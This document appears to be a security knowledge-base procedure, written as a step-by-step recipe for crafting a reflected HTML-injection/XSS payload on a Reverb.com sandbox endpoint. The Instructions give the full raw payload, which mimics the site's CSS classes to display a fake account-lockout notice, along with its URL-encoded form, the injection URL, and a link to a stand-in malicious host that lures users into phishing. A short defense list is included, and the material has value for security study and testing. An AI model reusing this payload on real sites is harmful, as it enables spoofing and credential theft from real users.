---
tags:
  - xss
  - payload-crafting
  - phishing
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:12.619Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: ec44eaff-c59a-4f31-8054-2ccb341a23c4
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft and Test XSS Payload for Spoofing

## Summary

This procedure details the creation and validation of an encoded HTML payload for reflected XSS in Reverb.com, using site-specific CSS classes to render a fake login lockout message that prompts users to click a malicious link for phishing.

## Description

Targeting the vulnerable query parameter, the payload injects a <span> element styled with Reverb's "bottom-alert" and "videos-header" classes, containing a <strong> header, <code> message, and <a> link with "btn" classes. Encoding prevents URL breakage, and testing confirms execution in the browser context. This enables social engineering attacks on logged-in users, leading to credential theft. Requires knowledge of Reverb's UI and URL encoding.

## Requirements

1. URL encoding tool (browser console or JavaScript encodeURIComponent).
2. Access to vulnerable endpoint from Step 1.
3. Understanding of HTML/CSS for mimicking UI.

## Defense

Defensive measures and detection strategies:

- Escape HTML entities in all reflected parameters.
- Use output encoding libraries like DOMPurify.
- Log and alert on payloads containing HTML tags in queries.

## Objectives

1. Build a payload that renders branded spoofed content.
2. Test for successful injection and styling.
3. Verify phishing link functionality.

## Instructions

### Step 1: Design Payload Structure

**Context**: Mimic Reverb's alert UI with specific classes for authenticity.

Construct raw HTML: <span class="bottom-alert videos-header"><strong>Log In to Reverb</strong><br><code>Due to multiple unsuccessful attempts to login to your account. Your account has been locked for your protection. Please click below to unlock it</code><br><br><a href="http://badwebsite.com"><span class="btn button button--orange button--wide">Unlock</span></a></span>.

> Expected: Payload that blends with site styling.

### Step 2: Encode and Inject Payload

**Context**: URL-encode to safely append to query parameter.

Encode using browser tools: %3Cspan%20class%3D%22bottom-alert%20%20videos-header%22%3E...%3C%2Fa%3E.

Load: https://sandbox.reverb.com/my/buying/orders?query=[encoded].

> Expected: Rendered alert without URL errors or sanitization.

### Step 3: Test Payload Execution

**Context**: Confirm visual and functional spoofing.

Inspect DOM for injected elements and click the link to verify redirection to http://badwebsite.com.

> Expected: Convincing fake message with working malicious link.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-crafting]]
- [[Phishing]]
